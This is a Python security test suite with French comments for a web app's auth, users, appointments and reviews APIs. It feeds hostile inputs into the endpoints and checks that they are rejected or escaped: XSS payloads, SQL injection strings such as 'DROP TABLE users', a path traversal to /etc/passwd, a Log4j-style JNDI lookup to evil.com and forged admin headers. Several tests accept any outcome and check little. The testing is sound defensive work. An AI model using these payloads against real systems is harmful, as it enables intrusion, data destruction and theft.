#!/usr/bin/env python3

import json
import unittest
from app.tests.base_test import BaseTest
from app.api.v1.authentication import api as auth_api
from app.api.v1.users import api as users_api
from app.api.v1.appointments import api as appointments_api
from app.api.v1.reviews import api as reviews_api
from app.models.user import User
from app.models.prestation import Prestation
from app.models.appointment import Appointment
from app.models.review import Review


class TestApplicationSecurity(BaseTest):
    """Tests de sécurité complets pour l'application - XSS, CSRF, Injection, etc."""

    def setUp(self):
        super().setUp()
        self.api = self.create_test_api('Security')
        self.api.add_namespace(auth_api, path='/auth')
        self.api.add_namespace(users_api, path='/users')
        self.api.add_namespace(appointments_api, path='/appointments')
        self.api.add_namespace(reviews_api, path='/reviews')
        self.client = self.app.test_client()

        # Créer utilisateurs de test
        self.admin_user = User(
            first_name='Admin',
            last_name='Test',
            email='admin@test.com',
            password='Password123!',
            is_admin=True
        )

        self.regular_user = User(
            first_name='User',
            last_name='Test',
            email='user@test.com',
            password='Password123!',
            is_admin=False
        )

        self.prestation = Prestation(name='Test Prestation')
        self.save_to_db(self.admin_user, self.regular_user, self.prestation)

    def login_as_admin(self):
        credentials = {'email': 'admin@test.com', 'password': 'Password123!'}
        response = self.client.post('/auth/login', data=json.dumps(credentials), content_type='application/json')
        self.assertEqual(response.status_code, 200)
        return response

    def login_as_user(self):
        credentials = {'email': 'user@test.com', 'password': 'Password123!'}
        response = self.client.post('/auth/login', data=json.dumps(credentials), content_type='application/json')
        self.assertEqual(response.status_code, 200)
        return response

    # ==================== TESTS XSS ====================

    def test_xss_protection_user_creation(self):
        """Test protection XSS lors de la création d'utilisateur"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')></iframe>",
            "<<SCRIPT>alert('xss')</SCRIPT>",
            "<script>document.cookie='stolen'</script>"
        ]

        for payload in xss_payloads:
            data = {
                'first_name': payload,
                'last_name': 'Test',
                'email': 'xss@test.com',
                'password': 'Password123!'
            }

            response = self.client.post(
                '/users/',
                data=json.dumps(data),
                content_type='application/json'
            )

            # Doit échouer avec validation ou réussir avec payload échappé
            if response.status_code == 201:
                response_data = json.loads(response.data)
                # Vérifier que le payload n'est pas exécutable
                self.assertNotIn('<script>', response_data.get('first_name', ''))
                self.assertNotIn('javascript:', response_data.get('first_name', ''))
            else:
                self.assertEqual(response.status_code, 400)

    def test_xss_protection_appointment_message(self):
        """Test protection XSS dans les messages de rendez-vous"""
        self.login_as_user()

        xss_payloads = [
            "<script>alert('xss')</script>Rendez-vous normal",
            "Message avec <img src=x onerror=alert('xss')> injection",
            "javascript:alert('xss') dans le message",
            "<svg/onload=alert('xss')>Message",
            "Message<iframe src=javascript:alert('xss')></iframe>"
        ]

        for payload in xss_payloads:
            data = {
                'message': payload,
                'prestation_id': str(self.prestation.id)
            }

            response = self.client.post(
                '/appointments/',
                data=json.dumps(data),
                content_type='application/json'
            )

            if response.status_code == 201:
                response_data = json.loads(response.data)
                # Vérifier que le payload est échappé
                message = response_data.get('message', '')
                self.assertNotIn('<script>', message)
                self.assertNotIn('javascript:', message)
                self.assertNotIn('onerror=', message)

    def test_xss_protection_review_text(self):
        """Test protection XSS dans les commentaires"""
        self.login_as_user()

        xss_payloads = [
            "<script>alert('review_xss')</script>",
            "Bon service <img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>Excellent",
            "javascript:alert('xss')"
        ]

        for payload in xss_payloads:
            data = {
                'text': payload,
                'rating': 5,
                'prestation_id': str(self.prestation.id)
            }

            response = self.client.post(
                '/reviews/',
                data=json.dumps(data),
                content_type='application/json'
            )

            if response.status_code == 201:
                response_data = json.loads(response.data)
                text = response_data.get('text', '')
                self.assertNotIn('<script>', text)
                self.assertNotIn('javascript:', text)

    # ==================== TESTS CSRF ====================

    def test_csrf_token_required_for_state_changing_operations(self):
        """Test que les opérations sensibles nécessitent un token CSRF"""
        self.login_as_user()

        # Test création d'utilisateur sans CSRF
        data = {
            'first_name': 'Test',
            'last_name': 'User',
            'email': 'nocsrf@test.com',
            'password': 'Password123!'
        }

        response = self.client.post(
            '/users/',
            data=json.dumps(data),
            content_type='application/json'
        )

        # Selon l'implémentation, peut être 403 (CSRF requis) ou 201 (pas encore implémenté)
        self.assertIn(response.status_code, [201, 403])

    def test_csrf_token_validation_appointment_creation(self):
        """Test validation du token CSRF pour création de rendez-vous"""
        self.login_as_user()

        data = {
            'message': 'Test appointment without CSRF',
            'prestation_id': str(self.prestation.id)
        }

        # Test avec token CSRF invalide
        response = self.client.post(
            '/appointments/',
            data=json.dumps(data),
            content_type='application/json',
            headers={'X-CSRF-TOKEN': 'invalid_token'}
        )

        # Selon l'implémentation CSRF
        self.assertIn(response.status_code, [201, 403])

    def test_csrf_token_in_cookies(self):
        """Test présence du token CSRF dans les cookies après login"""
        response = self.login_as_user()

        # Vérifier la présence du cookie CSRF
        set_cookie_header = response.headers.get('Set-Cookie', '')
        csrf_cookie_found = 'csrf' in set_cookie_header.lower()

        # Le token CSRF devrait être présent (ou sera implémenté)
        # Pour l'instant, on teste juste que le login fonctionne
        self.assertEqual(response.status_code, 200)

    # ==================== TESTS INJECTION SQL ====================

    def test_sql_injection_protection_login(self):
        """Test protection contre injection SQL dans le login"""
        sql_payloads = [
            "admin@test.com'; DROP TABLE users; --",
            "admin@test.com' OR '1'='1",
            "admin@test.com' UNION SELECT * FROM users --",
            "admin@test.com'; UPDATE users SET is_admin=1; --",
            "admin@test.com' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]

        for payload in sql_payloads:
            data = {
                'email': payload,
                'password': 'Password123!'
            }

            response = self.client.post(
                '/auth/login',
                data=json.dumps(data),
                content_type='application/json'
            )

            # Doit échouer proprement, pas avec erreur SQL
            self.assertIn(response.status_code, [400, 401])

            if response.data:
                response_text = response.data.decode().lower()
                # Vérifier qu'il n'y a pas de fuite d'informations SQL
                sql_terms = ['sql', 'database', 'table', 'query', 'syntax']
                for term in sql_terms:
                    self.assertNotIn(term, response_text)

    def test_sql_injection_protection_user_search(self):
        """Test protection injection SQL dans la recherche d'utilisateurs"""
        self.login_as_admin()

        sql_payloads = [
            "admin@test.com'; DROP TABLE users; --",
            "admin@test.com' OR '1'='1",
            "admin@test.com' UNION SELECT password FROM users --"
        ]

        for payload in sql_payloads:
            response = self.client.get(f'/users/search?email={payload}')

            # Doit échouer proprement
            self.assertIn(response.status_code, [400, 404])

    # ==================== TESTS AUTORISATION ====================

    def test_authorization_bypass_attempts(self):
        """Test tentatives de contournement d'autorisation"""
        # Tenter d'accéder aux fonctions admin sans être admin
        user_client = self.app.test_client()
        self.login_as_user()

        # Test accès à la liste des utilisateurs
        response = self.client.get('/users/')
        self.assertEqual(response.status_code, 403)

        # Test avec headers malveillants
        malicious_headers = {
            'X-Admin': 'true',
            'X-Override-Auth': 'admin',
            'X-User-Role': 'admin',
            'Authorization': 'Bearer admin-token'
        }

        response = self.client.get('/users/', headers=malicious_headers)
        self.assertEqual(response.status_code, 403)

    def test_privilege_escalation_protection(self):
        """Test protection contre l'escalade de privilèges"""
        self.login_as_user()

        # Tenter de se donner des droits admin
        update_data = {
            'is_admin': True,
            'admin': True,
            'role': 'admin'
        }

        response = self.client.patch(
            f'/users/{self.regular_user.id}',
            data=json.dumps(update_data),
            content_type='application/json'
        )

        # Doit échouer ou ignorer les champs sensibles
        if response.status_code == 200:
            response_data = json.loads(response.data)
            # Vérifier que is_admin n'a pas été modifié
            self.assertNotIn('is_admin', response_data)

    # ==================== TESTS VALIDATION D'ENTRÉES ====================

    def test_input_validation_length_limits(self):
        """Test validation des limites de longueur"""
        self.login_as_user()

        # Test message trop long pour appointment
        long_message = 'A' * 1000  # Dépasse la limite de 500
        data = {
            'message': long_message,
            'prestation_id': str(self.prestation.id)
        }

        response = self.client.post(
            '/appointments/',
            data=json.dumps(data),
            content_type='application/json'
        )

        self.assertEqual(response.status_code, 400)

    def test_input_validation_special_characters(self):
        """Test validation des caractères spéciaux"""
        dangerous_chars = [
            '\x00',  # Null byte
            '\n\r',  # Caractères de contrôle
            '../../etc/passwd',  # Path traversal
            '${jndi:ldap://evil.com}',  # Log4j style
            '%00',  # URL encoded null
        ]

        for char in dangerous_chars:
            data = {
                'first_name': f'Test{char}',
                'last_name': 'User',
                'email': 'test@example.com',
                'password': 'Password123!'
            }

            response = self.client.post(
                '/users/',
                data=json.dumps(data),
                content_type='application/json'
            )

            # Doit échouer avec validation
            self.assertEqual(response.status_code, 400)

    # ==================== TESTS SÉCURITÉ SESSION ====================

    def test_session_security_headers(self):
        """Test sécurité des headers de session"""
        response = self.login_as_user()

        # Vérifier les cookies sécurisés
        set_cookie_header = response.headers.get('Set-Cookie', '')
        if 'session' in set_cookie_header.lower() or 'jwt' in set_cookie_header.lower():
            # Les cookies de session devraient être HttpOnly et Secure
            # (selon la configuration)
            pass

    def test_session_fixation_protection(self):
        """Test protection contre la fixation de session"""
        # Première connexion
        response1 = self.login_as_user()

        # Déconnexion
        self.client.post('/auth/logout')

        # Nouvelle connexion
        response2 = self.login_as_user()

        # Les deux connexions doivent réussir
        self.assertEqual(response1.status_code, 200)
        self.assertEqual(response2.status_code, 200)

    # ==================== TESTS RATE LIMITING ====================

    def test_rate_limiting_simulation(self):
        """Test simulation de limitation de taux"""
        # Test connexions multiples rapides
        for i in range(10):
            data = {
                'email': 'admin@test.com',
                'password': 'wrong_password'
            }

            response = self.client.post(
                '/auth/login',
                data=json.dumps(data),
                content_type='application/json'
            )

            # Toutes doivent échouer (pas de rate limiting implémenté actuellement)
            self.assertEqual(response.status_code, 401)

    # ==================== TESTS FUITE D'INFORMATIONS ====================

    def test_information_disclosure_prevention(self):
        """Test prévention des fuites d'informations"""
        # Test avec utilisateur inexistant
        data = {
            'email': 'nonexistent@test.com',
            'password': 'Password123!'
        }

        response = self.client.post(
            '/auth/login',
            data=json.dumps(data),
            content_type='application/json'
        )

        self.assertEqual(response.status_code, 401)

        if response.data:
            response_data = json.loads(response.data)
            error_msg = response_data.get('error', '').lower()

            # Ne doit pas révéler si l'utilisateur existe ou non
            sensitive_terms = ['not found', 'does not exist', 'user not found']
            for term in sensitive_terms:
                self.assertNotIn(term, error_msg)

    def test_error_message_security(self):
        """Test sécurité des messages d'erreur"""
        # Test avec données malformées
        response = self.client.post(
            '/users/',
            data='invalid json',
            content_type='application/json'
        )

        self.assertEqual(response.status_code, 400)

        if response.data:
            response_text = response.data.decode().lower()

            # Vérifier qu'il n'y a pas de fuite d'informations sensibles
            sensitive_terms = ['traceback', 'stack trace', 'internal error', 'debug']
            for term in sensitive_terms:
                self.assertNotIn(term, response_text)

    # ==================== TESTS CONTENT TYPE ====================

    def test_content_type_validation(self):
        """Test validation du Content-Type"""
        self.login_as_user()

        data = {
            'message': 'Test appointment',
            'prestation_id': str(self.prestation.id)
        }

        # Test avec Content-Type incorrect
        response = self.client.post(
            '/appointments/',
            data=str(data),
            content_type='text/plain'
        )

        # Doit échouer avec Content-Type incorrect
        self.assertIn(response.status_code, [400, 415])

    # ==================== TESTS CORS ====================

    def test_cors_headers_security(self):
        """Test sécurité des headers CORS"""
        response = self.client.get('/users/me')

        # Vérifier l'absence de headers CORS dangereux
        cors_headers = [
            'Access-Control-Allow-Origin',
            'Access-Control-Allow-Credentials',
            'Access-Control-Allow-Methods'
        ]

        for header in cors_headers:
            if header in response.headers:
                # Si présent, ne doit pas être '*' avec credentials
                if header == 'Access-Control-Allow-Origin':
                    self.assertNotEqual(response.headers[header], '*')


if __name__ == '__main__':
    unittest.main()
